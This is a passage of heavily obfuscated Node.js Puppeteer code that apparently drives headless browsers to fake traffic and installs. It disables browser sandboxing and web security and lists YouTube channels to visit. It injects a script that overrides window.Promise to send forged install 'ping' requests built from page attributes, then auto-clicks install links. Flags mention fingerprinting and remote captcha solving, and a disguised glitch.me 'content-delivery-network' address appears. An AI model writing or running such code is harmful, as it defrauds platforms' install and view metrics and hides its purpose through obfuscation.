0x1] = this['hBytes'] << 0x1b * 0x17 + 0x1 * -0x1e4f + 0x1be5 * 0x1 | this['bytes'] >>> 0x16a0 + 0x3 * 0xa36 + -0x1 * 0x3525, J[0x23f2 + -0x1eec * 0x1 + 0x1 * -0x4f7] = this['bytes'] << 0x188b * 0x1 + 0x1 * -0x220f + 0x987, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x61 * -0x38 + 0x12 * -0x1 + 0x155a; J < 0x6dd + 0x39 * 0x19 + -0xc1e; ++J)
                K = Q[J - (0x197d + -0x2661 + -0xce7 * -0x1)] ^ Q[J - (-0x1 * 0x928 + -0xa1 * -0x5 + 0x60b)] ^ Q[J - (-0xab * -0x36 + 0x1f3 * -0x14 + 0x1 * 0x2f8)] ^ Q[J - (0x8b3 + -0x9e7 + 0x144)], Q[J] = K << -0x1675 * 0x1 + 0x1 * 0x226f + -0x5 * 0x265 | K >>> -0x248e + 0x6dc + 0x1dd1 * 0x1;
              for (J = 0x2 * 0x1016 + 0x1aa3 + 0x3acf * -0x1; J < -0x231e + -0x36 * -0x8f + -0xb8 * -0x7; J += 0x1829 * 0x1 + -0x1 * -0x21d1 + -0x39f5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1944 + -0xc61 + 0x25aa | L >>> 0x82b + -0x655 + -0x1bb) + (M & N | ~M & O) + P + (-0x74077d9 * 0xb + 0xd65f9a1 * -0xa + -0x2 * -0x9821b01b) + Q[J] << 0x1 * -0xc5b + -0x376 * 0x5 + 0x1 * 0x1da9) << 0xb5 * 0x25 + 0x1 * 0x51b + 0x1a5 * -0x13 | P >>> -0xcbf * 0x1 + -0x1 * 0x358 + 0x1032) + (L & (M = M << -0x5d0 + -0x210b + 0x26f9 | M >>> 0x38 + -0x8 * -0x2fc + -0x1816) | ~L & N) + O + (-0x5246c39a + -0x41b7c10e + 0xee80fe41) + Q[J + (-0x1 * 0xc25 + 0x1ab * -0x11 + 0x2881)] << -0x22a8 + -0x739 + 0x29e1) << 0x21 * -0x8 + -0x2 * -0x8eb + -0x10c9 | O >>> -0x257 * 0xa + 0xc94 + 0xaed) + (P & (L = L << 0x28 * -0x83 + -0x14fe + -0xa65 * -0x4 | L >>> 0x28 + 0x19 * 0xb5 + -0xd * 0x15f) | ~P & M) + N + (0x4 * 0xe02b2d8 + -0x418a * 0x26bda + 0xc1282bbd) + Q[J + (0x251a + -0x20a8 + 0x47 * -0x10)] << -0xe92 * -0x1 + -0xd15 * -0x1 + -0x1ba7) << -0x219f * -0x1 + 0x1bc6 + -0x3d60 | N >>> -0x2 * -0xae7 + -0xd * -0x5b + -0x1a52) + (O & (P = P << -0x281 * 0x3 + -0x123 * -0x5 + 0x53 * 0x6 | P >>> 0x1d84 + -0xedd + 0xa3 * -0x17) | ~O & L) + M + (0x7120b7ba + 0xce85a6 * 0x28 + -0x3 * 0x124bb55b) + Q[J + (0xcfc + 0x1591 * 0x1 + -0x2 * 0x1145)] << -0xea4 + -0x193a * 0x1 + 0x27de) << 0xa77 + 0x5 * 0x194 + 0x92b * -0x2 | M >>> 0x13 * 0x11b + 0x3b9 * -0x5 + -0x249) + (N & (O = O << 0xfc9 + -0x156e + 0x127 * 0x5 | O >>> -0x5ce * -0x5 + -0x6f * 0x2e + -0x912) | ~N & P) + L + (0x67cefa75 + 0xbdd * -0x4f215 + 0x2d5f6245) + Q[J + (-0x17a7 + -0x13cb + -0x2 * -0x15bb)] << 0x1b4f + -0x20e * 0x3 + -0x1525, N = N << 0xa51 * -0x1 + 0x1 * -0x2027 + -0x3 * -0xe32 | N >>> 0x1169 * -0x1 + 0x11 * 0x16f + -0x6f4;
              for (; J < 0x261a + 0x17c9 * 0x1 + -0x3dbb; J += 0x2191 + 0x25 * -0x41 + 0x1827 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1680 + -0x96c + 0x1ff1 * 0x1 | L >>> -0x19f * -0xb + 0xc99 + -0x1e53) + (M ^ N ^ O) + P + (0x897 * 0x155545 + 0xc2908420 + 0xb * -0x1844e9d6) + Q[J] << -0x1c3a + 0xd * 0x14b + 0xb6b) << -0x26a7 + -0x3e9 + 0xb * 0x3df | P >>> -0x419 * -0x6 + 0x1 * 0x2591 + 0xb * -0x5a4) + (L ^ (M = M << 0x1cb * -0x4 + 0x1 * 0x209c + 0x1cf * -0xe | M >>> 0x1 * -0x25de + -0x19 + 0x1 * 0x25f9) ^ N) + O + (-0x3d8271 * 0x17b + -0x4f890152 + -0x1f45abce * -0x9) + Q[J + (0x4 * 0x192 + -0x1 * -0x56 + 0x69d * -0x1)] << 0x2690 + -0x3 * -0x6b9 + -0x3abb) << 0x1bd3 * 0x1 + 0x7 * -0x47 + -0x19dd | O >>> 0x19 * -0x115 + -0xb4b + 0x2673) + (P ^ (L = L << -0x2 * -0x945 + 0x143 * -0x13 + -0x31 * -0x1d | L >>> 0xe * -0x3a + 0x22ec + -0x1fbe) ^ M) + N + (0xa5a234eb + -0xbe07befb * 0x1 + 0x873f75b1) + Q[J + (-0xe71 + 0x6 * 0x19c + 0x4cb)] << -0x5c1 * -0x3 + -0x1 * 0x285 + 0xebe * -0x1) << -0x228 + -0x1203 + 0x1430 | N >>> 0x1368 + 0x2163 * 0x1 + -0x30 * 0x119) + (O ^ (P = P << -0x207 * 0xe + 0x1d75 + -0xf5 | P >>> 0x836 + -0x1a * -0xe6 + -0x1 * 0x1f90) ^ L) + M + (-0x2e3 * -0xef839 + -0x608b7ee9 * -0x1 + -0x1ce81fd3) + Q[J + (-0x2016 + 0x16c7 + 0x952)] << -0x1507 + 0x42b * -0x8 + 0x365f) << -0x1 * 0x7a9 + -0x2 * 0xd71 + -0x8a4 * -0x4 | M >>> -0x172d + 0xeaa + 0x44f * 0x2) + (N ^ (O = O << 0x1 * -0x72f + -0x75d + 0x755 * 0x2 | O >>> 0x7 * 0x214 + -0xc1 * -0x33 + -0x34fd) ^ P) + L + (0x298971c5 * -0x3 + -0x1 * -0x9f319c45 + 0x4c44a4ab) + Q[J + (-0x1862 + 0xd35 + 0xb31)] << 0x2 * 0x583 + 0x9 * 0x17a + -0x30a * 0x8, N = N << 0x16bc + -0x31e + 0x9c * -0x20 | N >>> -0x8 * -0x32 + 0x5cf * 0x3 + -0x12fb;
              for (; J < 0x201a + -0x12e7 + 0x1 * -0xcf7; J += 0x3e * 0x59 + -0x2 * 0x178 + 0x17 * -0xcf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19df + 0x1f90 + 0x1 * -0x396a | L >>> -0x2bb + -0x131e + -0x119 * -0x14) + (M & N | M & O | N & O) + P - (0x77f1dde7 + 0x361a83ef + -0xcfb5b * 0x4b6) + Q[J] << -0x1848 + 0x1c62 + -0x41a) << -0xc37 * -0x1 + -0x1d91 + 0x1 * 0x115f | P >>> 0x2ef * -0x3 + 0xee8 * 0x1 + 0xc * -0x80) + (L & (M = M << 0x1c9 + 0x1 * -0x16e1 + 0x5 * 0x43e | M >>> -0x24d2 + -0x464 * 0x7 + -0x4390 * -0x1) | L & N | M & N) + O - (-0x42b8263 * 0x3 + -0x275bbd * -0x95 + 0x19 * 0x419892c) + Q[J + (0x97c * -0x1 + -0xcbe + 0x3 * 0x769)] << 0xd36 * 0x1 + -0x1 * 0x113f + 0x1 * 0x409) << 0x13 * 0x149 + 0x7bb * -0x4 + 0x686 * 0x1 | O >>> -0xaa * 0x2c + 0x21b7 + -0x464) + (P & (L = L << -0x1c83 + 0x1499 + -0x4 * -0x202 | L >>> -0x77 * 0x3 + -0x23fc + 0x2563) | P & M | L & M) + N - (0xc77243ca + -0x45bc1cb0 + -0x10d1e3f6) + Q[J + (-0x11fb + 0x1b * 0x5d + 0x82e)] << 0x1af7 + 0x34 * -0x53 + 0xc7 * -0xd) << 0x1 * 0x100f + 0x1790 + -0x279a | N >>> -0x158a + 0xc7f * -0x1 + 0x17c * 0x17) + (O & (P = P << 0xe37 + 0x2ed * 0x9 + 0xe1 * -0x2e | P >>> -0x51a + -0x86 * 0x9 + 0x9d2) | O & L | P & L) + M - (-0x3b91776d + 0x654bacbf + 0x472a0dd2) + Q[J + (-0x2 * 0xe6 + -0x1c1d + 0x1dec)] << -0x1 * -0xae7 + 0x211 * 0x11 + -0x2e08) << 0x15f5 + 0x4d1 * -0x3 + -0xd5 * 0x9 | M >>> -0x1077 + -0x15f + 0x11f1) + (N & (O = O << -0x12ee + -0x1 * 0x1559 + 0x2865 | O >>> -0x1fba + 0x1 * 0x1532 + 0x26 * 0x47) | N & P | O & P) + L - (0x225bb * 0x25b8 + -0x1 * 0x4bdc3393 + 0x6bc1514f) + Q[J + (-0xf1e + -0x18ce + 0x470 * 0x9)] << -0x1c87 + -0x180 + -0x1e07 * -0x1, N = N << 0x1 * 0x1a0d + -0x1 * 0x239 + 0x4be * -0x5 | N >>> -0x13be + -0x50b * -0x3 + 0x49f;
              for (; J < 0x173 * -0x1 + 0x8fe * 0x1 + -0x73b; J += -0x432 + -0x30 * 0x12 + 0x797)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2c6 + 0xd4e + 0x17 * -0x75 | L >>> -0x2 * -0xe6f + 0x217a + -0x3e3d) + (M ^ N ^ O) + P - (-0x27f43580 * 0x2 + 0x14e61cf1 + 0x709f8c39) + Q[J] << 0x1993 + 0x3 * -0x294 + 0x1 * -0x11d7) << -0x19 * 0x107 + 0x112e + 0x886 | P >>> 0xc16 + -0x17 * -0x6f + 0x57d * -0x4) + (L ^ (M = M << 0x1f * -0x8a + 0xd * -0xf9 + 0x1d79 | M >>> -0x8 * 0x52 + 0x140 + 0x152) ^ N) + O - (0x6893fe3f + 0x2093bc08 + -0x538a7c1d) + Q[J + (0x28f * 0xf + 0x17cb + 0x3 * -0x14b9)] << 0x102d + -0x269d + 0x1670) << -0xdbf + 0x662 + 0x762 | O >>> 0xb3d + -0x1 * -0xc0a + -0x172c) + (P ^ (L = L << 0x1 * 0x11c9 + 0x3 * 0x6c5 + -0x25fa | L >>> 0x78b + -0x48e + -0x2fb) ^ M) + N - (-0x1 * -0x308d678f + -0xb83 * 0x46c4f + -0xdfeaa02 * -0x4) + Q[J + (-0x1e7f + 0xe6 + 0x1d9b)] << -0x1 * 0x185e + 0x4 * -0x978 + 0x202 * 0x1f) << 0x243d + -0xb5c * 0x2 + -0x2 * 0x6c0 | N >>> 0x15a2 + -0x11 * -0x15d + -0x2cb4) + (O ^ (P = P << 0x10e4 + 0xf3e + -0x6 * 0x556 | P >>> 0x2079 + 0xdf + -0x2156) ^ L) + M - (-0x53af1958 + 0x1f * -0x2b86ff7 + 0x1115 * 0xcf97f) + Q[J + (0x66a * 0x6 + -0x19ab + -0x16 * 0x95)] << -0x263 * -0x6 + 0x74d * -0x3 + 0x795) << -0x2219 * 0x1 + 0xb * -0x1ba + 0xb * 0x4d4 | M >>> 0x43a + 0x221 + -0x40 * 0x19) + (N ^ (O = O << 0x1669 + 0xfa6 + -0x25f1 | O >>> -0x14 * 0xe7 + 0x98 * -0x32 + -0x123 * -0x2a) ^ P) + L - (-0x133b43a6 + 0x50a6a * -0x1501 + 0x1912 * 0x720f5) + Q[J + (-0x1167 + -0x159e + -0x3 * -0xd03)] << 0x2 * -0xa81 + 0xa0d + 0xaf5, N = N << -0x418 + 0x103d * -0x2 + 0x24b0 | N >>> 0x100 + -0x1540 + -0x1442 * -0x1;
              this['h0'] = this['h0'] + L << 0x2 * 0x9af + 0x14a8 + 0xda * -0x2f, this['h1'] = this['h1'] + M << 0x1b4e + 0x1348 + -0x2e96, this['h2'] = this['h2'] + N << 0x21fe + -0x1 * -0x260f + -0x480d, this['h3'] = this['h3'] + O << 0x24f7 + 0x1237 + -0x1 * 0x372e, this['h4'] = this['h4'] + P << -0x232a + -0x2b * 0x51 + 0x30c5;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x25f0 + 0x332 * -0xc + -0x84 * -0x1 & 0x220 * 0x3 + -0x892 * -0x2 + -0x1775] + w[J >> 0x2 * 0xbce + -0x22a9 + -0x13d * -0x9 & 0x1 * 0x10d5 + -0xca * -0xe + 0x6 * -0x4a3] + w[J >> -0x17 * 0x18b + 0x13 * -0x5 + 0x8fc * 0x4 & -0x215b * 0x1 + -0x1 * -0x1ded + 0x37d] + w[J >> -0x91d + -0xa6 * -0xc + 0x165 & -0xa85 * 0x2 + 0x88 + 0x1491] + w[J >> 0x3d7 + -0xd * 0x24f + 0xd1c * 0x2 & -0x1aea + -0x4c7 + 0x1fc0] + w[J >> 0x2 * 0x1271 + 0xe53 + -0x332d & -0x4f5 * 0x3 + 0x22af * -0x1 + -0x319d * -0x1] + w[J >> -0xd7f + -0x1 * 0x19d9 + 0x275c & -0xfa * -0x19 + -0x138 + 0x1723 * -0x1] + w[0x1 * 0x1993 + 0xb * -0x7c + 0x13 * -0x110 & J] + w[K >> 0x12ce + -0x1 * 0x99b + -0xd * 0xb3 & -0x3 * -0x6bd + -0x925 + 0xb03 * -0x1] + w[K >> -0x534 + -0xd92 + 0x12de & 0x1bf0 + 0x18ff + -0x34e0] + w[K >> 0x1 * 0x2b3 + -0x220b + -0x1f6c * -0x1 & -0xa77 + -0x25c3 * 0x1 + -0x3049 * -0x1] + w[K >> -0xe60 + -0x24a0 * 0x1 + 0x3310 & 0x3 * -0x37f + 0x392 * -0x4 + 0x18d4] + w[K >> -0x11 * 0x1bc + 0x149e + 0x8ea & -0x1 * -0x1bce + -0x255b + 0x99c] + w[K >> -0xf25 * 0x1 + -0x1e7 * -0x13 + -0x14f8 & -0x20b0 + 0x23ce * 0x1 + -0x30f * 0x1] + w[K >> 0x7c7 * 0x5 + -0x4a * -0x46 + -0x3b1b & 0x19 * -0x67 + 0xef + 0x92f] + w[0xd4f * 0x1 + 0x318 + -0x1058 * 0x1 & K] + w[L >> 0x12a8 + -0xbb0 + 0x36e * -0x2 & -0x1900 + 0x706 * 0x1 + 0x1209] + w[L >> -0x73b + 0x8db * 0x4 + -0x1 * 0x1c19 & -0x7b0 + 0x1bd9 + -0x141a] + w[L >> -0x1edf + 0x2 * -0xe67 + -0x13eb * -0x3 & -0x664 * 0x3 + 0x1b0d + -0x7d2] + w[L >> -0x1 * 0xb65 + 0x2545 + -0x19d0 & -0x243 * 0x7 + 0x11f * 0xf + -0xed * 0x1] + w[L >> -0x136 * -0x5 + -0x90b + 0x15 * 0x25 & 0x48f + -0x1a42 + 0x15c2] + w[L >> -0x6d3 + -0x2556 + -0x4e9 * -0x9 & -0x244 * 0x1 + -0x1 * 0x1d21 + 0x7dd * 0x4] + w[L >> -0x23c5 * 0x1 + 0x21cf + 0x2 * 0xfd & -0x46 * 0x18 + -0x2527 * 0x1 + 0x2bc6] + w[-0x3e1 * 0x4 + 0x1573 + -0x5e * 0x10 & L] + w[M >> 0xaf + 0x1b6 + -0x3 * 0xc3 & -0x4 * -0x317 + 0x1e76 + -0x2ac3] + w[M >> -0x1b46 + -0x30 * -0xc5 + -0x992 & 0x1949 + 0x22e * -0x1 + -0x170c] + w[M >> -0x43 * 0x52 + 0x1 * -0x1c0 + 0x174a & -0x854 + -0x11c3 + -0x1a26 * -0x1] + w[M >> 0x1bfe + 0x4e7 * 0x4 + -0x2f8a & -0x1 * 0x2615 + -0x1 * 0x1561 + 0x3b85] + w[M >> -0x165 + -0x8aa + 0xa1b & -0x5cb * -0x2 + 0x607 * -0x1 + 0x4 * -0x160] + w[M >> -0x386 + 0xd * -0x44 + 0x702 & -0x2519 + 0x2 * -0x4bd + 0x2ea2] + w[M >> -0x39 * -0xac + -0x1 * -0x68e + -0x2cd6 & -0x12d * 0xe + -0x21ef + -0x2 * -0x193a] + w[0x1 * -0x1b24 + 0x146b + 0x6c8 & M] + w[N >> -0x11b * -0x20 + -0x176b + -0xbd9 & -0xa60 + -0x327 + 0xd96] + w[N >> 0xa * 0x199 + -0x2205 + -0x1 * -0x1223 & 0xcf * 0x22 + -0x19c5 * -0x1 + 0x3c * -0xe3] + w[N >> -0x23 * -0xa7 + -0xdf * 0x12 + 0x713 * -0x1 & 0x7ab + 0x815 * -0x1 + 0x79] + w[N >> -0x2024 + -0x2a1 * -0x3 + 0x1851 & 0x2 * -0x495 + -0x1 * -0xf1 + 0x848] + w[N >> -0x14ff + 0x139 * 0xb + -0x6 * -0x144 & -0x1f7 * 0x8 + 0x1a42 + -0xa7b] + w[N >> 0x26b8 + -0xa * 0x279 + -0xdf6 & 0x888 + 0x2c3 * -0x5 + 0x556] + w[N >> 0x710 + -0x1b53 * -0x1 + -0x225f & 0x167 + 0x7 * 0x415 + -0x1deb] + w[0x5f1 * -0x3 + 0x2d * 0x3e + 0x37e * 0x2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x827 * 0x2 + 0x1aad + -0x1 * 0xa47 & 0x11dd * 0x2 + -0xad + 0x2 * -0x1107,
                J >> 0xfc7 + -0x343 * -0x2 + -0x163d & -0xe95 * 0x1 + -0xc03 + -0x3f1 * -0x7,
                J >> 0x1 * 0x14f5 + -0x5c * -0x68 + -0x3a4d & 0x1ab + 0x89 + -0x1 * 0x135,
                0x18ad + 0x185d + -0x300b & J,
                K >> 0xd * -0x20 + 0x1755 + -0x159d * 0x1 & -0x9c * 0x11 + -0x1d * 0x137 + 0x174b * 0x2,
                K >> -0x1 * -0x337 + 0x832 + -0x53 * 0x23 & 0xa7 * 0x19 + 0x13d5 + -0x3 * 0xbb7,
                K >> 0x3 * 0x3df + -0x2 * -0xf1a + -0x29c9 & -0x18d * 0x11 + -0xd * 0x1d + 0x1cd5,
                -0x1039 * -0x1 + -0xb * 0x38 + -0x446 * 0x3 & K,
                L >> -0x23 * 0xef + -0x14b1 * 0x1 + 0x3576 & 0x1 * -0x1f51 + -0x14a + -0x187 * -0x16,
                L >> 0xe7 * -0x10 + 0x5 * 0x26b + 0x269 & 0x7 * -0x4fd + 0x2 * 0x1332 + -0x27a,
                L >> -0x2 * -0xca7 + 0x3 * -0x4e8 + -0xa8e & -0x25bd + -0x19 * -0x14 + 0x24c8 * 0x1,
                0xef * -0xb + -0x2 * -0x4be + 0x1c8 & L,
                M >> -0x1c80 + -0x8a8 + 0x2540 & 0x3e7 * -0xa + -0x99 * 0x11 + 0x322e,
                M >> -0x21c2 + -0x6 * 0x107 + 0x4 * 0x9ff & 0xad + -0xb * -0x329 + -0x3 * 0xb7b,
                M >> 0x1445 * 0x1 + 0x203f + -0x347c & -0x1111 + -0x1e53 + 0x3063,
                0x1dda + -0x72b * 0x4 + -0x2f & M,
                N >> -0x1ba1 + 0x9 * -0x9d + 0x213e & 0xb8d + 0x33 * -0x1 + 0xa5b * -0x1,
                N >> 0x1da3 + -0x3 * -0xbfb + -0x4184 & -0x21f6 + -0xc2e * -0x3 + 0x87 * -0x3,
                N >> 0x6ed + 0x4d * 0x27 + 0x8 * -0x254 & 0x622 + -0x1aba * -0x1 + -0x1 * 0x1fdd,
                -0x4aa * 0x5 + 0x15ee + 0x263 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1bcd * 0x1 + -0x82f + 0x2410), (K = new DataView(J))['setUint32'](-0x1b4a + -0x19b7 * 0x1 + 0x3501, this['h0']), K['setUint32'](0xb * -0x18b + -0x220 + 0x131d * 0x1, this['h1']), K['setUint32'](0x1643 + -0xa3 + -0x1598, this['h2']), K['setUint32'](0x7 * 0x281 + -0x709 * -0x5 + 0x4 * -0xd2a, this['h3']), K['setUint32'](-0x1a91 + -0x1285 * -0x1 + 0x81c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x11de + 0x50 * 0x4 + -0x131e];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * 0x1ec1 + 0x51 * -0x39 + -0x9c2 * -0x5;
            J[0x1de * 0x14 + -0x816 + -0x1d42]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x234d + 0x6c8 + 0x1c85] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xc91 * -0x2 + 0x25bd * 0x1 + -0x3ede * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xe * -0xd6 + 0x15d7 + 0x3ba * -0x9;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xc5 + -0x1496 + 0x1b37 * 0x1), Promise['resolve'](0x1a96 * -0x1 + -0x134 * 0x1a + 0x39df);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x17 * 0x107 + -0x1626 + -0x17b; j < -0x1cb9 + -0x6e2 + -0x4 * -0x8e7; j++)
    i();
}
const NETWORK_PATIENCE = -0x1779 + -0x2703 + 0x5dbc + (0x1016 + 0x9 * -0x1f7 + 0xd51) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2397 * -0x1 + -0x8c * -0xa + -0x290c) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + W(0x8),
    'https://ww' + 'w.youtube.' + X(0x12, 'pqb1') + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xd42 + -0x90a + -0x438; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x55c * -0x3 + 0x1a5 * 0x1 + 0xe6f);
    let h = e[f];
    if (b['ZeRzVJ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x9ad * 0x3 + -0x1bf1 * -0x1 + -0x8b * -0x2, s, t, u = 0x1 * 0x997 + 0x1ec2 + 0x3 * -0xd73; t = n['charAt'](u++); ~t && (s = r % (-0x214e + -0x1 * 0x1e7d + 0x3fcf) ? s * (-0x58 * 0x4 + 0x4 * 0x262 + 0x2e * -0x2c) + t : t, r++ % (0xe83 + 0x236 * 0x1 + 0x2f * -0x5b)) ? p += String['fromCharCode'](-0x583 + 0x910 + 0x6 * -0x6d & s >> (-(0x2320 + -0x1c * 0xbc + 0x4da * -0x3) * r & 0x17 * -0x12f + 0x11dc + 0x3 * 0x321)) : 0x3 * -0x16 + 0x252e * 0x1 + 0x1 * -0x24ec) {
          t = o['indexOf'](t);
        }
        for (let v = 0x3 * -0xae7 + 0x8 * 0x2a + 0x3 * 0xa77, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x529 * 0x3 + -0x2 * 0xd8b + -0xbab * -0x1))['slice'](-(0x12 * 0x185 + -0x1 * -0xd23 + -0x287b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xe01 * -0x2 + 0x1 * -0x1d1b + 0x1 * 0x391d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2a * 0x5b + -0x59 * 0x5 + -0x133 * 0xb; u < 0x154a + -0xdb2 * -0x2 + -0x2fae; u++) {
          p[u] = u;
        }
        for (u = 0x74b * -0x1 + 0x15a9 + -0xe5e; u < 0x795 * 0x1 + -0x1 * -0x1ff3 + -0x336 * 0xc; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x3b * -0x12 + -0x615 * -0x6 + -0x88 * 0x3b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x371 + -0x157e + 0x18ef, q = -0x55d * -0x6 + 0x3e8 + -0x2416 * 0x1;
        for (let v = -0x1 * 0xa1c + -0x223 * 0x10 + -0xb4 * -0x3f; v < n['length']; v++) {
          u = (u + (-0xad * -0x1d + 0x1 * -0x11e6 + -0x1b2)) % (0x10fe + 0x97f + -0x197d), q = (q + p[u]) % (0x2e * 0xd0 + -0x1e03 + -0x21f * 0x3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xc1 + -0x9e7 + 0x8 * 0x175)]);
        }
        return t;
      };
      b['vzlTMX'] = m, c = arguments, b['ZeRzVJ'] = !![];
    }
    const j = e[0xed9 + -0x2 * -0x1237 + -0x3347],
      k = f + j,
      l = c[k];
    return !l ? (b['SUuyGX'] === undefined && (b['SUuyGX'] = !![]), h = b['vzlTMX'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bn = [
    'mIGvECkKW7ZcNaxcPeW',
    'yZa3mti4ntK0yG',
    'rg/en/scri',
    'BG3dMdpcTMKVp2er',
    'tevhWOFcOx9aW5JcU8kQ',
    'FmoWW6/cQSkNWR4Dhury',
    'Ahr0Chm6lY9NCG',
    'zs95B3v0DwjLlG',
    'Basic',
    'zs9ZDxj2AxyUAq',
    'eFceshvavn',
    'x0DSB2jHBf9oyq',
    'min',
    'D8oxcuaJWQZcQWJcUGy',
    'L3iHS__ufc',
    'zs9TB29TB28UAq',
    'close',
    'riptor',
    'WO4tWRldGafdsSkcW4CQ',
    'Ahr0Chm6lY9VCa',
    'y3jLyxrLsw5JBW',
    '-itself-3b',
    'zs8Q',
    '\x20studio,mr',
    'createHash',
    'CMvZzwfYy2G',
    'W6BdUxdcLx0Mo8opWOFdIa',
    'r-see-invi'
  ];
  a = function() {
    return bn;
  };
  return a();
}
